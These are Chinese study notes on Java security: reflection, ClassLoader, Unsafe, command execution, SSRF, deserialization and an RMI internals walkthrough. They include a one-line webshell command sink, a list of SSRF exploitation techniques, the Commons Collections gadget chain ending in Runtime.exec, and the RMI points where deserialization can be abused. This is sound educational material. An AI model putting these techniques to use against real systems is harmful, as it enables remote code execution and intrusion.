---

title: JAVA安全
---

# JAVA安全

## 基础

### 反射

- 作用

  - 获取类中的成员变量、成员方法或构造方法，也就是一个类中的所有信息（在字节码文件class中获取）（综合练习1）
  - 结合配置文件动态创建对象（综合练习2）

  ![Snipaste_2025-03-18_17-40-56](JAVA安全/Snipaste_2025-03-18_17-40-56.png)

  - 获取class对象（Class类）

    - Class.forName("全类名")

      ![Snipaste_2025-03-18_17-45-08](JAVA安全/Snipaste_2025-03-18_17-45-08.png)

    - 类名.class

      ![Snipaste_2025-03-18_17-45-20](JAVA安全/Snipaste_2025-03-18_17-45-20.png)

    - 对象.getClass();

      ![Snipaste_2025-03-18_17-45-30](JAVA安全/Snipaste_2025-03-18_17-45-30.png)

  - 效果展示

    ![Snipaste_2025-03-18_18-20-01](JAVA安全/Snipaste_2025-03-18_18-20-01.png)

  - 获取构造方法（Constructor）

    ![Snipaste_2025-03-18_18-31-00](JAVA安全/Snipaste_2025-03-18_18-31-00.png)

    - ![Snipaste_2025-03-19_11-44-48](JAVA安全/Snipaste_2025-03-19_11-44-48.png)

  - 获取成员变量（Field）

    ![Snipaste_2025-03-19_11-17-48](JAVA安全/Snipaste_2025-03-19_11-17-48.png)

    - ![Snipaste_2025-03-19_11-43-47](JAVA安全/Snipaste_2025-03-19_11-43-47.png)

  - 获取成员方法（Method）

    <img src="JAVA安全/Snipaste_2025-03-19_14-00-41.png" alt="Snipaste_2025-03-19_14-00-41" style="zoom:150%;" />

    - ![Snipaste_2025-03-19_14-01-05](JAVA安全/Snipaste_2025-03-19_14-01-05.png)

- 综合练习

  - 保存任意对象数据
  - 利用反射动态创建对象和运行

### ClassLoader

- 作用
  - 加载任意Java类文件
  - 通过自定义ClassLoader实现自定义类加载行为
- 分类
  - Bootstrap ClassLoader 
    - 加载 JDK 的核心类
  - Extension ClassLoader(Java9后被 Platform ClassLoader取代)
    - 加载平台特定的扩展和 JDK 模块系统中的类
  - App ClassLoader
    - 从应用的类路径加载类
- 双亲委派模型
  - 模型过程
    - JVM从底层加载器`App ClassLoader`开始
    - `App ClassLoader`先检查类是否已加载，若没有则委派给`Extension ClassLoader`
    - `Extension ClassLoader`同理委派给`Bootstrap ClassLoader`
    - 从`Bootstrap ClassLoader `开始寻找并加载类，若找不到则由`Extension ClassLoader`执行同样过程，同理由顶层向下加载
    - 若所有加载器都失败则抛出`ClassNotFoundException`

  - 功能原则
    - 委派原则
      - 子类加载器总是先将类加载请求委派给父类加载器，保证如核心类由`Bootstrap ClassLoader `加载，也就是各类由相应的加载器加载

    - 可见性原则
      - 子类可见父类加载器的类，反之则不然

    - 唯一性原则
      - 保证同一类只被加载一次

- 核心方法
  - `loadClass(String name, boolean resolve)`：加载指定的类，如果 resolve 为 true，则解析类。
  - `defineClass()`：将字节数组定义为类实例，如果字节码格式错误，抛出 ClassFormatError（该方法为 final，不可重写）。
  - `findClass(String name)`：查找但不加载类，通常由自定义类加载器重写。
  - `findLoadedClass(String name)`：检查类是否已加载。
  - `Class.forName(String name, boolean initialize, ClassLoader loader)`：加载并初始化类，如果加载器为 null，使用引导类加载器。

#### 子类加载器

- 自定义ClassLoader
  - 作用
    - 在webshell中实现加载并调用自己编译的类对象
- URLClassLoader
  - 作用
    - 加载远程的jar来实现远程类方法调用

#### 可利用的漏洞加载器

##### JSP自定义类加载器后门

##### BCEL ClassLoader

##### Xalan ClassLoader

### Unsafe类

`sun.misc.Unsafe`类提供涉及底层的`内存、CAS、线程调度、类、对象`等操作的方法

#### 通过反射获取Unsafe对象

- 获取theUnsafe成员变量

```java
// 反射获取Unsafe的theUnsafe成员变量
Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");

// 反射设置theUnsafe访问权限
theUnsafeField.setAccessible(true);

// 反射获取theUnsafe成员变量值
Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
```

- 获取实例化Unsafe对象

```java
// 获取Unsafe无参构造方法
Constructor constructor = Unsafe.class.getDeclaredConstructor();

// 修改构造方法访问权限
constructor.setAccessible(true);

// 反射创建Unsafe类实例，等价于 Unsafe unsafe1 = new Unsafe();
Unsafe unsafe1 = (Unsafe) constructor.newInstance();
```

#### Unsafe类中可利用的方法

##### allocateInstance无视构造方法创建类实例

- 作用
  - 绕过不能使用反射创建类实例的限制

##### defineClass直接调用JVM创建类对象

若ClassLoader类被限制，不能调用defineClass0/1/2方法在JVM注册类，可以使用该方法

- 方式

```java
//方式一适用Java8以前版本
public native Class defineClass(String var1, byte[] var2, int var3, int var4);

//方式二适用Java8版本
public native Class defineClass(String var1, byte[] var2, int var3, int var4, ClassLoader var5, ProtectionDomain var6);
```

- 例子

```java
Class helloWorldClass = unsafe1.defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);


// 获取系统的类加载器
ClassLoader classLoader = ClassLoader.getSystemClassLoader();

// 创建默认的保护域
ProtectionDomain domain = new ProtectionDomain(
    new CodeSource(null, (Certificate[]) null), null, classLoader, null
);

// 使用Unsafe向JVM中注册com.anbai.sec.classloader.TestHelloWorld类
Class helloWorldClass = unsafe1.defineClass(
    TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length, classLoader, domain
);
```

### Java文件系统安全

- Java中内置两种文件系统
  - java.io
  - sun.nio(java.nio)

#### 文件读写方式

##### 阻塞模式java.io.FileSystem

- FileInputStream
- FileInputStream
- RandomAccessFile

##### 非阻塞模式java.nio.file.spi.FileSystemProvider

Java 7提出的基于NIO的文件系统

#### 文件名空字节截断漏洞



### 本地命令执行

#### Runtime

```java
Runtime.getRuntime().exec(request.getParameter("cmd"))
```

- `exec`执行逻辑

  1.`Runtime.exec(xxx)`
  2`.java.lang.ProcessBuilder.start()`
  3.`new java.lang.UNIXProcess(xxx)`
  4.`UNIXProcess`构造方法中调用了`forkAndExec(xxx) native`方法。
  5.`forkAndExec`调用操作系统级别`fork->exec(*nix)/CreateProcess(Windows)`执行命令并返回`fork/CreateProcess`的PID。

  `Runtime`和`ProcessBuilder`并不是程序的最终执行点

- 用反射执行`Runtime.exec`，用字节码代替类或方法名

#### ProcessBuilder



#### UnixProcess/ProcessImpl

调用`native`类执行命令，该类提供了叫`forkAndExec`的方法来执行本地系统命令

####  forkAndExec

1. 使用`sun.misc.Unsafe.allocateInstance(Class)`特性可以无需`new`或者`newInstance`创建`UNIXProcess/ProcessImpl`类对象。
2. 反射`UNIXProcess/ProcessImpl`类的`forkAndExec`方法。
3. 构造`forkAndExec`需要的参数并调用。
4. 反射`UNIXProcess/ProcessImpl`类的`initStreams`方法初始化输入输出结果流对象。
5. 反射`UNIXProcess/ProcessImpl`类的`getInputStream`方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。

####  JNI

Java通过JNI调用动态链接库，在动态链接库写入本地命令执行的方法

### JDBC基础

`JDBC(Java Database Connectivity)`:Java抽象出的对数据库进行存在的API接口

Java通过`java.sql.DriverManager`来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在`java.sql.DriverManager`中注册对应的驱动类，然后调用`getConnection`方法才能连接上数据库。

JDBC定义了一个叫`java.sql.Driver`的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。

- 连接数据库

  ```java
  String CLASS_NAME = "com.mysql.jdbc.Driver";
  String URL = "jdbc:mysql://localhost:3306/mysql"
  String USERNAME = "root";
  String PASSWORD = "root";
  
  Class.forName(CLASS_NAME);// 用数据库驱动名注册JDBC驱动类
  Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
  ```

#### DataSource

在实际的Java项目中用数据源(`javax.sql.DataSource`)来代替`DriverManager`管理数据库的连接。

- 数据库源

  - Web容器自带
    -  `Tomcat JNDI DataSource`
    - `Resin JNDI DataSource`
  - 第三方
    - `DBCP`
    - `C3P0`
    - `Druid`
    - `Mybatis DataSource`

  - 在Spring MVC中可以自由的选择第三方数据源，通常会定义一个`DataSource Bean`用于配置和初始化数据源对象，然后在Spring中通过Bean注入的方式获取数据源对象。

### URLConnection

表示应用程序以及与URL建立通信连接的所有类的超类，通过`URL`类中的`openConnection`方法获取到`URLConnection`的类对象。

支持以下协议:

```java
file ftp mailto http https jar netdoc gopher(jdk8以后被阉割)
```

#### SSRF

- Java中SSRF漏洞利用
  - 利用`file`协议读取文件内容（仅限使用`URLConnection|URL`发起的请求）
  - 利用`http` 进行内网web服务端口探测
  - 利用`http` 进行内网非web服务端口探测(如果将异常抛出来的情况下)
  - 利用http进行`ntlmrelay`攻击(仅限`HttpURLConnection`或者二次包装`HttpURLConnection`并未复写`AuthenticationInfo`方法的对象)

### Java类序列化

- 序列化：

  - 将Java类实例化为字节数组
  - 使用`java.io.ObjectOutputStream`类中的`writeObject`方法实现
  - 限制
    - 静态成员变量是不能被序列化
    - transient 标识的对象成员变量不参与序列化

- 反序列化：

  - 将序列化后的二进制数组转换为对应的Java类实例

  - 通过实现实现`java.io.Serializable(内部序列化)`或`java.io.Externalizable(外部序列化)`接口即可被序列化

    - 使用`java.io.ObjectInputStream`类中的`readObject`方法实现

    ```java
    //实现java.io.Serializable，需要反序列化的类要继承接口
    public class DeserializationTest implements Serializable {
    }
    
    //实现java.io.Externalizable，额外定义了writeExternal和readExternal方法，其它部分一样
    public interface Externalizable extends java.io.Serializable {
      void writeExternal(ObjectOutput out) throws IOException;
      void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;
    
    }
    ```

  - 反序列化对象的限制

    - 被反序列化的类必须存在。

    - `serialVersionUID`值必须一致。

      ```java
      //实现了java.io.Serializable接口的类原则上都需要生产一个serialVersionUID常量，此接口用来标识该接口可序列化
      public interface Serializable {
      }
      ```

  - 实现了`java.io.Serializable`接口的类，还可在main方法外自定义方法

    ```java
    private void writeObject(ObjectOutputStream oos),自定义序列化。
    private void readObject(ObjectInputStream ois)，自定义反序列化。
    private void readObjectNoData()。
    protected Object writeReplace()，写入时替换对象。
    protected Object readResolve()。
    ```

- 反序列化漏洞的共同条件

  - 继承 `Serializable`
  - 入口类 source（重写`readObject`方法调用常见函数；**参数类型宽泛**，如URLDNS中可传入整个URL类作为参数；最好JDK自带）
  - 调用链 gadget chain（同名同类型调用）
  - 执行类 sink（RCE、SSRF等操作）

- 反序列化漏洞可能的形式

  - 入口类的`readObject()`直接调用危险方法（基本不可能）
  - 入口类参数含可控类，该类有危险方法，`readObject()`调用
  - 入口类参数含可控类，该类调用其它有危险方法的类，`readObject()`调用
  - 构造函数/静态代码块类加载隐式执行

#### Apache Commons Collections反序列化漏洞

- TransformedMap调用链详解

  - Transformer接口类

    ```java
    public interface Transformer {
        public Object transform(Object input);
    }
    ```

  - ConstantTransformer（常量转换方法）

    ```java
     public Object transform(Object input) {
            return iConstant;
        }
    ```

  - InvokerTransformer（反射调用方法）

    ```java
     public Object transform(Object input) {
            if (input == null) {
                return null;
            }
    
            try {
                  // 获取输入类的类对象
                Class cls = input.getClass();
    
                  // 通过输入的方法名和方法参数，获取指定的反射方法对象
                Method method = cls.getMethod(iMethodName, iParamTypes);
                  // 反射调用指定的方法并返回方法调用结果
                return method.invoke(input, iArgs);
            } catch (Exception ex) {
                // 省去异常处理部分代码
            }
        }
    ```

  - ChainedTransformer（依次调用transform方法）

    ```java
    public Object transform(Object object) {
          for (int i = 0; i < iTransformers.length; i++) {
              object = iTransformers[i].transform(object);
          }
    ```

  - TransformedMap（触发InvokerTransformer的方法执行本地命令）
    - 实现了`java.io.Serializable`接口；
    - 可以构建的`TransformedMap`对象；
    - 调用了`TransformedMap`中的`setValue/put/putAll`中的任意方法一个方法的类；

  - AnnotationInvocationHandler（间接调用TransformedMap中的MapEntry的setValue方法，从而触发transform方法，完成整个攻击链）

- 完整的攻击链

  ```java
  ObjectInputStream.readObject()
    ->AnnotationInvocationHandler.readObject()
        ->TransformedMap.entrySet().iterator().next().setValue()
            ->TransformedMap.checkSetValue()
          ->TransformedMap.transform()
            ->ChainedTransformer.transform()
              ->ConstantTransformer.transform()
              ->InvokerTransformer.transform()
                ->Method.invoke()
                  ->Class.getMethod()
              ->InvokerTransformer.transform()
                ->Method.invoke()
                  ->Runtime.getRuntime()
              ->InvokerTransformer.transform()
                ->Method.invoke()
                  ->Runtime.exec()
  ```



### RMI

`Remote Method Invocation`，Java远程方法调用，用于构建分布式应用程序，实现了`Java`程序之间跨`JVM`的远程通信。将整个远程调用的复杂网络通信流程封装为代理如Stub

![Snipaste_2025-03-26_12-43-26](JAVA安全/Snipaste_2025-03-26_12-43-26.png)

#### 具体工作原理

![Routine](JAVA安全/Routine.png)

分为三部分

- Server
- Registry
- Client

涉及各自的创建(3)以及三部分之间两两通信(6)总计**九个**过程，以下会从RMI的实现然后是具体的代码流程进行分析



流程图

```java
sequenceDiagram
    participant Client
    participant Registry
    participant Stub
    participant Server

    Client->>Registry: lookup("ServiceName")
    Registry->>Client: 返回Stub（代理对象）
    Client->>Stub: 调用方法（如process()）
    Stub->>Server: 发送序列化请求（方法名、参数）
    Server->>Stub: 返回序列化结果
    Stub->>Client: 反序列化结果
```

#### 服务端实现

1. 首先要创建一个远程接口，其中定义了要调用的方法，用于客户端远程调用

   ```java
   import java.rmi.Remote;
   import java.rmi.RemoteException;
   
   //继承Remote接口
   public interface IRemoteObj extends Remote {
       public String sayHello(String keywords) throws RemoteException;
   }
   ```

   - 接口必须继承`java.rmi.Remote`
   - 声明的方法必须抛出`java.rmi.RemoteException`

2. 然后要实现接口中的方法

   ```java
   import java.rmi.RemoteException;
   import java.rmi.server.UnicastRemoteObject;
   
   public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj {
       public RemoteObjImpl() throws RemoteException{
   //        UnicastRemoteObject.exportObject(this, 0);
       }
   
       @Override
       public String sayHello(String keywords) throws RemoteException {
           String upKeywords = keywords.toUpperCase();
           System.out.println(upKeywords);
           return upKeywords;
       }
   }
   ```

   - 实现类必须继承`UnicastRemoteObject`，或手动导出对象（注释处）

3. 最后创建服务端对象

   ```java
   import java.rmi.AlreadyBoundException;
   import java.rmi.RemoteException;
   import java.rmi.registry.LocateRegistry;
   import java.rmi.registry.Registry;
   
   public class RMIServer {
       public static void main(String[] args) throws RemoteException, AlreadyBoundException {
           //实例化对象
           RemoteObjImpl remoteObj = new RemoteObjImpl();
           //创建注册中心
           Registry registry = LocateRegistry.createRegistry(1099);
           //将对象绑定到注册中心
           registry.bind("remoteObj", remoteObj);
       }
   }
   ```

   - Registry中存储Stub(客户端代理)，Stub是整个远程对象，包括方法的执行

#### 客户端实现

1. 同样要创建远程接口用于获取远程调用的对象

   ```java
   import java.rmi.Remote;
   import java.rmi.RemoteException;
   
   public interface IRemoteObj extends Remote {
       public String sayHello(String keywords) throws RemoteException;
   }
   ```

2. 然后创建客户端对象

   ```java
   import java.rmi.NotBoundException;
   import java.rmi.RemoteException;
   import java.rmi.registry.LocateRegistry;
   import java.rmi.registry.Registry;
   
   public class RMIClient {
       public static void main(String[] args) throws RemoteException, NotBoundException {
           //从注册中心中获取stub用于处理远程对象的网络请求
           Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
           //确定要调用的网络接口
           IRemoteObj remoteObj = (IRemoteObj) registry.lookup("remoteObj");
           //调用网络接口下的方法
           remoteObj.sayHello("Hello");
       }
   }
   ```

   - Client与Registry通信后首次获取Stub，其后便直接通过Stub调用方法，也就是Stub是实际处理Client与Server之间网络通信而封装的代理
   - Stub中封装了服务端的网络地址(IP:Port)和对象标识(ObjID)，还负责处理序列化与反序列化的网络通信
   - 客户端获取的是Stub的序列化数据，然后在本地重建代理对象。

#### 服务端创建

先分析服务端的具体创建，在实例化对象处打断点调试

![Snipaste_2025-04-03_13-48-49](JAVA安全/Snipaste_2025-04-03_13-48-49.png)

- 然后一直跟到`UnicastRemoteObject`里面，在这里面封装并发布了具体实现网络请求的代理，这里默认端口为0，若没有具体给定端口则后面会自行赋值一个随机端口，然后具体网络服务的发布是通过`exportObject()`实现，继续跟进

  ![Snipaste_2025-04-03_12-00-16](JAVA安全/Snipaste_2025-04-03_12-00-16.png)

  - 这里的obj是实现远程方法调用的代码逻辑的，那处理网络请求的就是`UnicastServerRef()`

    ![Snipaste_2025-04-03_12-00-54](JAVA安全/Snipaste_2025-04-03_12-00-54.png)

  - 然后跟进可以看到它`new LiveRef()`，而这个`LiveRef`就是非常重要的一个类了，算是一个网络引用的类，里面封装了很多涉及网络处理的对象

    ![Snipaste_2025-04-03_12-03-12](JAVA安全/Snipaste_2025-04-03_12-03-12.png)

  - ObjID就是对象标识，主要看`LiveRef`的构造函数，跟进this

    ![Snipaste_2025-04-03_12-03-26](JAVA安全/Snipaste_2025-04-03_12-03-26.png)

    - 前面封装了怎么多层，终于出现了涉及具体网络请求的类`TCPEndpoint`，可以看到传入host和port就能具体处理网络请求

    ![Snipaste_2025-04-03_12-04-21](JAVA安全/Snipaste_2025-04-03_12-04-21.png)

  - 回到`LiveRef`的构造，可以看到host和port是赋值到endpoint中的，而endpoint又在LiveRef里面，所以涉及网络处理的数据都在`LiveRef`中，而且后面会看到不管是客户端还是服务端的`LiveRef`自始至终都是同一个

    ![Snipaste_2025-04-03_12-05-18](JAVA安全/Snipaste_2025-04-03_12-05-18.png)

- 回到最初的`LiveRef`，会发现在它的父类`UnicastRef`进行了一个赋值操作，而这个类对应的客户端，之前的`UnicastServerRef`对应的是服务端，这也说明`LiveRef`始终没变

  ![Snipaste_2025-04-03_12-06-48](JAVA安全/Snipaste_2025-04-03_12-06-48.png)

- 一路跟最终又调用了一个新的`exportObject()`，这里可以发现整个创建过程就是不停的将网络处理过程赋值封装再调用`exportObject()`，最终的目的就是发表网络服务

  ![Snipaste_2025-04-03_12-07-19](JAVA安全/Snipaste_2025-04-03_12-07-19.png)

- 接着就是一路跟踪一直到又一个重要的封装对象Stub处，会发现Stub这个动态代理是在Server创建的，然后发布到Registry，最后再被Client获取

  ![Snipaste_2025-04-03_12-08-43](JAVA安全/Snipaste_2025-04-03_12-08-43.png)

  - 跟进看具体的创建过程，这里封装了远程对象的实现类以及IP:Port

    ![Snipaste_2025-04-03_12-14-00](JAVA安全/Snipaste_2025-04-03_12-14-00.png)

  - 这里就看到了通过类加载创建动态代理的过程

    ![Snipaste_2025-04-03_12-18-05](JAVA安全/Snipaste_2025-04-03_12-18-05.png)

- 最后创建好了动态代理Stub

  ![Snipaste_2025-04-03_12-19-40](JAVA安全/Snipaste_2025-04-03_12-19-40.png)

- 再一路跟到下一个重要的封装对象Target，这里的Target就是将所有封装对象再做了一次总的封装，最后也是将Taget发布到Registry上

  ![Snipaste_2025-04-03_12-20-16](JAVA安全/Snipaste_2025-04-03_12-20-16.png)

  - 跟进查看一下Taget都封装了什么

    ![Snipaste_2025-04-03_12-22-04](JAVA安全/Snipaste_2025-04-03_12-22-04.png)

  - 这里比较一下disp和stub，分别对应Server和Client，可以看到ref是同一个

    ![Snipaste_2025-04-03_12-23-47](JAVA安全/Snipaste_2025-04-03_12-23-47.png)

- 跳出去就到了Target的发布

  ![Snipaste_2025-04-03_12-25-28](JAVA安全/Snipaste_2025-04-03_12-25-28.png)

  - 看一下具体的发布逻辑，这里又是在不同类中反复调用`exportObject`，最后到了`TCPTransport`中，这个类也就是真正的执行类

    ![Snipaste_2025-04-03_12-27-21](JAVA安全/Snipaste_2025-04-03_12-27-21.png)

  - 这里服务端开了监听端口

    ![Snipaste_2025-04-03_12-27-55](JAVA安全/Snipaste_2025-04-03_12-27-55.png)

  - 再到下面的`newServerSocket()`

    ![Snipaste_2025-04-03_12-29-03](JAVA安全/Snipaste_2025-04-03_12-29-03.png)

    ![Snipaste_2025-04-03_12-33-15](JAVA安全/Snipaste_2025-04-03_12-33-15.png)

  - 这里创建了新的socket等待连接，并且若默认port为0这里还进行了端口的随机赋值

    ![Snipaste_2025-04-03_12-40-03](JAVA安全/Snipaste_2025-04-03_12-40-03.png)

- 之后就是在Thread完成网络连接的过程，整个创建过程也就完成了，将Target发布到Registry后就是等待Client获取Stub连接通信

  ![Snipaste_2025-04-03_12-37-22](JAVA安全/Snipaste_2025-04-03_12-37-22.png)

  ![Snipaste_2025-04-03_12-37-52](JAVA安全/Snipaste_2025-04-03_12-37-52.png)

- 在发布完成后在Server中还会有记录

  ![Snipaste_2025-04-03_14-42-53](JAVA安全/Snipaste_2025-04-03_14-42-53.png)

  - `target.setExportedTransport(this)`就是一些赋值，记录发生在`ObjectTable`中，跟进`ObjectTable.*putTarget*(target)`

    ![Snipaste_2025-04-03_12-42-24](JAVA安全/Snipaste_2025-04-03_12-42-24.png)

    ![Snipaste_2025-04-03_12-45-00](JAVA安全/Snipaste_2025-04-03_12-45-00.png)

    - 这里将信息保存到了*objTable*和*implTable*两个表中

- 总结一下整个创建过程就是通过`exportObject()`将远程服务发布到指定的IP和Port上，并且还创建了用于客户端操作的网络代理Stub，只是不停的赋值封装，然后又在不同的类中反复调用`exportObject()`，使整个过程显得复杂，最后的记录保存到静态的HashMap中，可以理解为日志

#### 注册中心创建

在createRegistry处下断点

![Snipaste_2025-04-03_16-32-07](JAVA安全/Snipaste_2025-04-03_16-32-07.png)

- 然后跟进`createRegistry()`，Registry默认端口就是1099，所以这里写与不写都可

  ![Snipaste_2025-04-03_16-33-27](JAVA安全/Snipaste_2025-04-03_16-33-27.png)

- 接着往下创建了`RegistryImpl`，这里的if进行了安全检查，不重要

  ![Snipaste_2025-04-03_16-35-54](JAVA安全/Snipaste_2025-04-03_16-35-54.png)

- 然后这里创建了`LiveRef`

  ![Snipaste_2025-04-03_16-37-05](JAVA安全/Snipaste_2025-04-03_16-37-05.png)

  - 可以看到和Server创建的ref基本一致

    ![Snipaste_2025-04-03_16-37-48](JAVA安全/Snipaste_2025-04-03_16-37-48.png)

  - 但是跟进`setup()`就有不同的了，这里的第三个参数为true，也就是创建了一个永久对象，而下面那张图也就是Server中的参数为flase，所以创建的是临时对象

    ![Snipaste_2025-04-03_16-38-59](JAVA安全/Snipaste_2025-04-03_16-38-59.png)

    ![Snipaste_2025-04-03_12-07-19](JAVA安全/Snipaste_2025-04-03_12-07-19.png)

    - 但二者的逻辑基本一致都是先赋值再用`exportObject()`发布

- 接着往下有到了创建`Stub`，这里用于Registry与Client或Server进行通信

  ![Snipaste_2025-04-03_16-46-18](JAVA安全/Snipaste_2025-04-03_16-46-18.png)

  - 但跟进`createProxy()`后会发现Registry创建Stub与Server创建的逻辑不同

    ![Snipaste_2025-04-03_16-48-21](JAVA安全/Snipaste_2025-04-03_16-48-21.png)

    ![Snipaste_2025-04-03_16-48-47](JAVA安全/Snipaste_2025-04-03_16-48-47.png)

  - 这里判断是否存在所创建对象且后缀为_Stub的类，也就是`RegistryImpl_Stub`类，若存在则会创建Stub，而这个类是封装在JDK中的，所以Registry的Stub由JDK直接提供，可以看到后面Skeleton的创建也是相同的方法

    ![Snipaste_2025-04-03_16-50-29](JAVA安全/Snipaste_2025-04-03_16-50-29.png)

  - 直接通过反射获取自带类创建

    ![Snipaste_2025-04-03_16-52-01](JAVA安全/Snipaste_2025-04-03_16-52-01.png)

- 接着往下则是创建Skeleton

  ![Snipaste_2025-04-03_16-54-50](JAVA安全/Snipaste_2025-04-03_16-54-50.png)

  ![Snipaste_2025-04-03_16-56-50](JAVA安全/Snipaste_2025-04-03_16-56-50.png)

  ![Snipaste_2025-04-03_16-57-15](JAVA安全/Snipaste_2025-04-03_16-57-15.png)

- Skeleton也是通过反射加载的相同逻辑不多赘述，接下来也是Target封装全部对象

  ![Snipaste_2025-04-03_16-58-59](JAVA安全/Snipaste_2025-04-03_16-58-59.png)

##### Registry封装的内容

- 然后发布的逻辑都一样直接到`ObjectTable`处看都封装了些什么

  ![Snipaste_2025-04-03_17-08-00](JAVA安全/Snipaste_2025-04-03_17-08-00.png)

  - 可以看到这里共有三个对象，分别查看三个对象中disp下的ref和stub，第一个对象是`$Proxy`

    ![Snipaste_2025-04-03_17-17-45](JAVA安全/Snipaste_2025-04-03_17-17-45-17436732751891.png)

  - 然后第二个是`DGCImpl_Stub`，它是自动创建的，是分布式垃圾回收的一个对象

    ![Snipaste_2025-04-03_17-18-21](JAVA安全/Snipaste_2025-04-03_17-18-21.png)

  - 然后第三个才是这次创建的`RegistryImpl_Stub`

    ![Snipaste_2025-04-03_17-19-01](JAVA安全/Snipaste_2025-04-03_17-19-01.png)

  - 可以看到三者中的ref和stub都相同，所以都是一个东西，但代码只创建`RegistryImpl`对象，但实际上却有三个对象，这里之后讨论

#### 绑定

过程很简单就是`hashTable.put(IP, port)`，检查name是否存在，不存在则put进去

![Snipaste_2025-04-03_17-54-50](JAVA安全/Snipaste_2025-04-03_17-54-50.png)

#### 客户端请求注册中心

##### 获取注册中心

通过`getRegistry()`获取，在此处下断点

![Snipaste_2025-04-04_09-56-48](JAVA安全/Snipaste_2025-04-04_09-56-48.png)

- 进入方法，通过host和port获取

  ![Snipaste_2025-04-04_09-57-14](JAVA安全/Snipaste_2025-04-04_09-57-14.png)

- 往下跟同样的创建`LiveRef`，然后封装ip和端口，随后建立Stub进行通信

  ![Snipaste_2025-04-04_09-57-47](JAVA安全/Snipaste_2025-04-04_09-57-47.png)

  - 可以跟进看一下`Stub`的创建

    ![Snipaste_2025-04-04_09-59-54](JAVA安全/Snipaste_2025-04-04_09-59-54.png)

    ![Snipaste_2025-04-04_10-00-55](JAVA安全/Snipaste_2025-04-04_10-00-55.png)

    - 可以看到和Registry建立`Stub`是一样的逻辑都是JDK自带的

##### 查找远程对象

与Registry建立通信后便是使用`lookup()`查找远程对象的`Stub`

![Snipaste_2025-04-04_10-02-17](JAVA安全/Snipaste_2025-04-04_10-02-17-17437344863001.png)

- 进入该方法，可以看到序列化要请求的远程对象，Registry会通过反序列化读取

  ![Snipaste_2025-04-04_10-06-59](JAVA安全/Snipaste_2025-04-04_10-06-59.png)

- 漏洞点出现在下面的`invoke()`中，通过代码逻辑可以看出该方法是处理网络请求的，跟进去是一个接口，然后在`UnicastRef`找到接口的实现

  ![Snipaste_2025-04-04_10-08-23](JAVA安全/Snipaste_2025-04-04_10-08-23.png)

  ![Snipaste_2025-04-04_10-09-02](JAVA安全/Snipaste_2025-04-04_10-09-02.png)

  - 代码会从`executeCall()`调用到`out.getDGCAckHandler()`，而这个方法下面的异常2本意是将报错信息整个拿出来，但是若注册中心返回恶意的对象此处便可作为漏洞点利用，而且Client的每次通信都会触发该方法。

    ![Snipaste_2025-04-04_10-13-46](JAVA安全/Snipaste_2025-04-04_10-13-46.png)

- 回到原本的逻辑还有一处漏洞点，可以看到Client和Server通信的Stub同样以序列化的形式传输，也意味着可以构造恶意对象进行利用

  ![Snipaste_2025-04-04_10-10-41](JAVA安全/Snipaste_2025-04-04_10-10-41.png)

- 最后便是获取到了远程对象也就是Stub动态代理

  ![Snipaste_2025-04-04_10-19-16](JAVA安全/Snipaste_2025-04-04_10-19-16.png)

#### 客户端请求服务端

此处便是客户端请求服务端调用远程对象其下的方法，也就是远程方法调用

![Snipaste_2025-04-04_10-20-16](JAVA安全/Snipaste_2025-04-04_10-20-16.png)

- 跟进invoke()中间就是一堆判断然后抛出异常，到尾部才是方法调用处

  ![Snipaste_2025-04-04_10-21-33](JAVA安全/Snipaste_2025-04-04_10-21-33-17437359384253.png)

  - 进入`invokeRemoteMethod()`，这里有个重载的`invoke()`，漏洞点就在该方法中

    ![Snipaste_2025-04-04_10-22-53](JAVA安全/Snipaste_2025-04-04_10-22-53.png)

  - 往下跟到循环中有一个`marshalValue()`，这里将参数序列化

    ![Snipaste_2025-04-04_10-24-54](JAVA安全/Snipaste_2025-04-04_10-24-54.png)

    ![Snipaste_2025-04-04_11-14-12](JAVA安全/Snipaste_2025-04-04_11-14-12.png)

  - 再往后又调用了`call.executeCall()`之前看到过该方法中有个异常报错漏洞点

    ![Snipaste_2025-04-04_10-26-05](JAVA安全/Snipaste_2025-04-04_10-26-05.png)

  - 再往下是另一个漏洞点，此处会将远程方法调用的结果返回

    ![Snipaste_2025-04-04_10-27-32](JAVA安全/Snipaste_2025-04-04_10-27-32.png)

    ![Snipaste_2025-04-04_10-29-23](JAVA安全/Snipaste_2025-04-04_10-29-23.png)

##### 小结

- Client远程方法调用的整个流程就是先获取注册中心，然后查找远程对象获取到Server发布的ref，然后与Server建立连接，进行通信，调用方法，获得返回值

#### 注册中心处理客户端请求

客户端那边操作的是`Stub`，而服务端这边操作的是`Skel`，而`Skel`经过网络处理后会放在Traget里面，所以将断点打在处理Target的地方

![Snipaste_2025-04-04_18-16-06](JAVA安全/Snipaste_2025-04-04_18-16-06.png)

- 然后是将`skel`放进`disp`

  ![Snipaste_2025-04-04_18-20-24](JAVA安全/Snipaste_2025-04-04_18-20-24.png)

- 随后进入`dispatch()`

  ![Snipaste_2025-04-04_11-45-40](JAVA安全/Snipaste_2025-04-04_11-45-40.png)

  - 因为skel不为null，所以进入`oldDispatch()`

  ![Snipaste_2025-04-04_11-46-46](JAVA安全/Snipaste_2025-04-04_11-46-46.png)

  - 然后是`skel.dispatch()`，这里就是**客户端打注册中心**的攻击方式

    ![Snipaste_2025-04-04_11-47-42](JAVA安全/Snipaste_2025-04-04_11-47-42.png)

- 然后漏洞发生在`RegistryImpl_Skel`

  ![Snipaste_2025-04-04_11-48-41](JAVA安全/Snipaste_2025-04-04_11-48-41.png)

  - 会发现里面的`bind()`、`lookup()`、`rebind()`、`unbind()`都可以触发反序列化

    ![Snipaste_2025-04-04_18-44-28](JAVA安全/Snipaste_2025-04-04_18-44-28.png)

    ![Snipaste_2025-04-04_18-44-57](JAVA安全/Snipaste_2025-04-04_18-44-57.png)

    ![Snipaste_2025-04-04_18-45-27](JAVA安全/Snipaste_2025-04-04_18-45-27.png)

